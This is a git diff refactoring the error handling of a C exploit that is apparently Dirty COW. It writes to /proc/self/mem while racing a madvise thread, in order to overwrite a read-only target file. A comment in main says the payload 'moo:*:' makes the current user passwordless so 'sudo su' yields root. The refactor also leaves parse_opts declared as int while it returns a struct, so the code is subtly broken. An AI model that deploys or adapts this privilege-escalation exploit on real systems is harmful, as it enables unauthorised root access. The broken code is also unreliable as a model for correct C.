@@ -15,6 +15,23 @@
 #include <sys/types.h>
 #include <sys/mman.h>
 
+#define ERR_IF(cond) \
+	do { \
+		if (cond) {	\
+			perror(__func__); \
+			exit(EXIT_FAILURE); \
+		} \
+	} while (0)
+
+#define ERR_IF_PTHREAD(status) \
+	do { \
+		int _val = status; \
+		if (_val > 0) {	\
+			fprintf(stderr, "%s: %s\n", __func__, strerror(_val)); \
+			exit(EXIT_FAILURE); \
+		} \
+	} while (0)
+
 typedef struct payload_info {
 	char *string;
 	off_t offset;
@@ -24,22 +41,13 @@ typedef struct payload_info {
     bool append;
 } PayloadInfo;
 
-void print_error(int error) {
-	fprintf(stderr, "Value of error: %d\n", error);
-	fprintf(stderr, "Error message: %s\n", strerror(error));
-	exit(EXIT_FAILURE);
-}
-
 // Write payload to mmap'd memory
 void *writer_thread(void *arg) {
 	PayloadInfo *info = arg;
 	char *str = info->string;
 
 	int fd = open("/proc/self/mem", O_RDWR);
-
-	if (fd < 0) {
-		print_error(errno);
-	}
+	ERR_IF(fd < 0);
 
 	for (int i = 0; i < 10000; i++) {
 		if (info->append) {
@@ -60,10 +68,13 @@ void *madviser_thread(void *arg) {
 	}
 }
 
-int parse_opts(PayloadInfo *info, int argc, char * argv[]) {
-	info->input_fd = STDIN_FILENO;
-	info->offset = 0x0;
-	info->append = 0;
+int parse_opts(int argc, char *argv[]) {
+	PayloadInfo info = {
+		.input_fd = STDIN_FILENO,
+		.offset = 0x0,
+		.append = 0
+	};
+
 	char interpret = 's';
 	int c;
 
@@ -95,16 +106,12 @@ int parse_opts(PayloadInfo *info, int argc, char * argv[]) {
 				printf ("\n");
 				break;
 			case 'f':  // file containing payload
-				info->input_fd = open (optarg, O_RDONLY);
-
-				if (info->input_fd < 0) {
-					print_error(errno);
-				}
-
+				info.input_fd = open(optarg, O_RDONLY);
+				ERR_IF(info.input_fd < 0);
 				break;
 			case 'o':  // offset position for payload (hex)
-				sscanf(optarg, "%x", (unsigned int*) &info->offset);
-				printf("offset: %d\n", (int) info->offset);
+				sscanf(optarg, "%x", (unsigned int*) &info.offset);
+				printf("offset: %d\n", (int) info.offset);
 				break;
 			case 's':  // interpret contents of payload as a string
 				interpret = 's';
@@ -113,7 +120,7 @@ int parse_opts(PayloadInfo *info, int argc, char * argv[]) {
 				interpret = 'x';
 				break;
 			case 'a':  // append to target file
-				info->append = 1;
+				info.append = 1;
 				break;
 			case 'h':
 				print_help();
@@ -131,13 +138,10 @@ int parse_opts(PayloadInfo *info, int argc, char * argv[]) {
 	}
 
 	// Open target file
-	info->target_fd = open(argv[argc-1], O_RDONLY);
+	info.target_fd = open(argv[argc-1], O_RDONLY);
+	ERR_IF(info.target_fd < 0);
 
-	if (info->target_fd < 0) {
-		print_error (errno);
-	}
-
-	return EXIT_SUCCESS;
+	return info;
 }
 
 void print_help() {
@@ -150,12 +154,11 @@ void print_help() {
 			"\nTarget file name must be the last argument\n");
 }
 
-int main(int argc, char * argv[]) {
-	PayloadInfo info;
-	parse_opts(&info, argc, argv);
+int main(int argc, char *argv[]) {
+	PayloadInfo info = parse_opts(argc, argv);
 
 	struct stat file_info;
-	fstat(info.target_fd, &file_info);
+	ERR_IF(fstat(info.target_fd, &file_info) < 0);
 
 	// Make current user passwordless, able to use "sudo su" to gain root access
 	info.string = "moo:*:";
